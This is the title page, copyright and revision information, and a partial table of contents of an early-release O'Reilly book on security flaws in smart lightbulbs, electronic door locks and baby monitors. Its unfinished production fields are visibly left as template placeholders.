
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
1. Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts. . . . . . . . . . . . . . .  1
Why hue?                                                                                                                             2
Contolling Lights Via the Website Interface                                                                  4
Information Leakage                                                                                                    13
Drive-by Blackouts                                                                                                       14
Weak Password Complexity and Password Leaks                                                   15
Controlling Lights Using the iOS App                                                                          18
Stealing the Token from a Mobile Device                                                                 32
Malware Can Cause Perpetual Blackout                                                                   33
Changing Lightbulb State                                                                                               37
If This Then That (IFTTT)                                                                                             40
Conclusion                                                                                                                        42
2. Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security. . . . . . .  45
Hotel Door Locks and Magnetic Stripes                                                                       46
The Onity Door Lock                                                                                                  46
The Magnetic Stripe                                                                                                     48
The Programming Port                                                                                               50
Security Issues                                                                                                               50
Vendor Response                                                                                                          51
The Case of Z-Wave-Enabled Door Locks                                                                   52
Z-Wave Protocol and Implementation Analysis                                                      52
Exploiting Key Exchange Vulnerability                                                                    54
Bluetooth Low Energy and Unlocking Via Mobile Apps                                           55
Understanding Weaknesses in BLE and Using Packet-Capture Tools                 56
Kevo Kwikset Mobile App Insecurities                                                                     61
Conclusion                                                                                                                        69
iii

3. Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing. . . . . . . . .  71
The Foscam Incident                                                                                                       72
Foscam Vulnerabilities Exposed by Researchers                                                     73
Using Shodan to Find Baby Monitors Exposed on the Internet                           74
Exploiting Default Credentials                                                                                   76
Exploiting Dynamic DNS                                                                                           78
The Foscam Saga Continues                                                                                       79
The Belkin WeMo Baby Monitor                                                                                  81
Bad Security by Design                                                                                                88
